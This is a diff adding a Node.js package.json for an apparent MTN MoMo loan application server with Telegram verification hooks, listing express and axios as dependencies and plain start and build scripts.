@@ -1,0 +1,21 @@
+{
+  "name": "mtn-momo-loan-verify",
+  "version": "1.0.0",
+  "description": "MTN MoMo Loan Application Platform with Telegram verification hooks",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "build": "echo 'No custom build step needed'"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "axios": "^1.7.7",
+    "express": "^4.21.1"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  }
+}
+
